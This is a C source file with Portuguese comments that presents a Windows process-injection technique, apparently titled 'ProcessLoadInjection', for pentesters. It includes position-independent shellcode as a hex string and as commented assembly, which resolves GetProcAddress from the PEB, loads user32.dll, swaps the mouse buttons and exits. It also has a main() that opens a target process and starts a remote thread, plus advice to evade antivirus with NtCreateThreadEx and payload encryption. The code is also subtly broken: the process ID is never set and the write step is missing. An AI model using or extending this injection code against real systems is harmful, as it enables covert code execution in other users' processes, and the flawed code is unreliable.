#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

/*Injeçao de DLL  furtiva via injeçao de shellcode para pentesters e  hackers eticos



Fluxo de Ataque->> 1- OpenProcess Obtenha um HANDLE para o processo na qual quer injetar
2-VirtualAllocEx-> aloque memoria para seu shellcode
3-WriteProcessMemory-> iscreva o shellcode na memoria do seu processo.
4-CreateRemoteThread()->  Crie uma Thread   remota para execuçao do nosso payloada
5-Nosso shellcode iria  chmar a  DLL  e irar expotara nossa funçao  para execuçao

para evitar detecçoes por AV ,use  NtCreateThreadEx;
se pode cripotgrafar a carga util enfim vai da criaatividade do autor.
**Ob:Ainda falta testar
Detalhes da tecnica: Em vez  de carregar nossa DLL num processo remoto por meio de injetor,podemos injetar uma carga util na memoria do processo e a carga util   carregara  dinamicamente nossa DLL   e  executara o codigo.
Nome da tecnica:ProcessLoadInjection.  --> Autor:*/

//
//
int main(){

char  *payloadDllInjection="\x33\xC9\x64\x8B\x41\x30\x8B\x40\x0C\x8B\x70\x14\xAD\x96\xAD\x8B\x58\x10\x8B\x53\x3C\x03\xD3\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03"
    "\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72\x65\x75"
    "\xE2\x8B\x72\x24\x03\xF3\x66\x8B\x0C\x4E\x49\x8B\x72\x1C\x03\xF3\x8B\x14\x8E\x03\xD3\x33\xC9\x53\x52\x51\x68\x61\x72\x79\x41\x68"
    "\x4C\x69\x62\x72\x68\x4C\x6F\x61\x64\x54\x53\xFF\xD2\x83\xC4\x0C\x59\x50\x51\x66\xB9\x6C\x6C\x51\x68\x33\x32\x2E\x64\x68\x75\x73"
    "\x65\x72\x54\xFF\xD0\x83\xC4\x10\x8B\x54\x24\x04\x33\xC9\x51\xB9\x74\x6F\x6E\x61\x51\x83\x6C\x24\x03\x61\x68\x65\x42\x75\x74\x68"
    "\x4D\x6F\x75\x73\x68\x53\x77\x61\x70\x54\x50\xFF\xD2\x83\xC4\x14\x33\xC9"
    "\x41"
    "\x51\xFF\xD0\x83\xC4\x04\x5A\x5B\xB9\x65\x73\x73\x61"
    "\x51\x83\x6C\x24\x03\x61\x68\x50\x72\x6F\x63\x68\x45\x78\x69\x74\x54\x53\xFF\xD2\x33\xC9\x51\xFF\xD0";;//payload em assembly pra injeçao de DLL furtiva





























DWORD pid;
HANDLE proc=OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
payloadDllInjection=VirtualAllocEx(proc, NULL, sizeof payloadDllInjection, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
HANDLE thread=CreateRemoteThread(proc, NULL, 0, (LPTHREAD_START_ROUTINE)payloadDllInjection, NULL, 0, NULL);
WaitForSingleObject(thread,INFINITE);//agurade a thread num tempo INFINITO
return(0);


}




//chamar uma dll  exportar a funçao de interesse executar a funçao







/*xor ecx, ecx
mov eax, fs:[ecx + 0x30] ; EAX = PEB
mov eax, [eax + 0xc]     ; EAX = PEB->Ldr
mov esi, [eax + 0x14]    ; ESI = PEB->Ldr.InMemOrder
lodsd                    ; EAX = Second module
xchg eax, esi            ; EAX = ESI, ESI = EAX
lodsd                    ; EAX = Third(kernel32)
mov ebx, [eax + 0x10]    ; EBX = Base address
mov edx, [ebx + 0x3c]    ; EDX = DOS->e_lfanew
add edx, ebx             ; EDX = PE Header
mov edx, [edx + 0x78]    ; EDX = Offset export table
add edx, ebx             ; EDX = Export table
mov esi, [edx + 0x20]    ; ESI = Offset namestable
add esi, ebx             ; ESI = Names table
xor ecx, ecx             ; EXC = 0

Get_Function:

inc ecx                              ; Increment the ordinal
lodsd                                ; Get name offset
add eax, ebx                         ; Get function name
cmp dword ptr[eax], 0x50746547       ; GetP
jnz Get_Function
cmp dword ptr[eax + 0x4], 0x41636f72 ; rocA
jnz Get_Function
cmp dword ptr[eax + 0x8], 0x65726464 ; ddre
jnz Get_Function
mov esi, [edx + 0x24]                ; ESI = Offset ordinals
add esi, ebx                         ; ESI = Ordinals table
mov cx, [esi + ecx * 2]              ; Number of function
dec ecx
mov esi, [edx + 0x1c]                ; Offset address table
add esi, ebx                         ; ESI = Address table
mov edx, [esi + ecx * 4]             ; EDX = Pointer(offset)
add edx, ebx                         ; EDX = GetProcAddress

xor ecx, ecx    ; ECX = 0
push ebx        ; Kernel32 base address
push edx        ; GetProcAddress
push ecx        ; 0
push 0x41797261 ; aryA
push 0x7262694c ; Libr
push 0x64616f4c ; Load
push esp        ; "LoadLibrary"
push ebx        ; Kernel32 base address
call edx        ; GetProcAddress(LL)

add esp, 0xc    ; pop "LoadLibrary"
pop ecx         ; ECX = 0
push eax        ; EAX = LoadLibrary
push ecx
mov cx, 0x6c6c  ; ll
push ecx
push 0x642e3233 ; 32.d
push 0x72657375 ; user
push esp        ; "user32.dll"
call eax        ; LoadLibrary("user32.dll")

add esp, 0x10                  ; Clean stack
mov edx, [esp + 0x4]           ; EDX = GetProcAddress
xor ecx, ecx                   ; ECX = 0
push ecx
mov ecx, 0x616E6F74            ; tona
push ecx
sub dword ptr[esp + 0x3], 0x61 ; Remove "a"
push 0x74754265                ; eBut
push 0x73756F4D                ; Mous
push 0x70617753                ; Swap
push esp                       ; "SwapMouseButton"
push eax                       ; user32.dll address
call edx                       ; GetProc(SwapMouseButton)

add esp, 0x14 ; Cleanup stack
xor ecx, ecx  ; ECX = 0
inc ecx       ; true
push ecx      ; 1
call eax      ; Swap!

add esp, 0x4                    ; Clean stack
pop edx                         ; GetProcAddress
pop ebx                         ; kernel32.dll base address
mov ecx, 0x61737365             ; essa
push ecx
sub dword ptr [esp + 0x3], 0x61 ; Remove "a"
push 0x636f7250                 ; Proc
push 0x74697845                 ; Exit
push esp
push ebx                        ; kernel32.dll base address
call edx                        ; GetProc(Exec)
xor ecx, ecx                    ; ECX = 0
push ecx                        ; Return code = 0
call eax                        ; ExitProcess



//acima  estao as intruçoes em assembly,verifique a arquitetura

*/
//Referencias usadas ->https://securitycafe.ro/2016/02/15/introduction-to-windows-shellcode-development-part-3/
//https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess

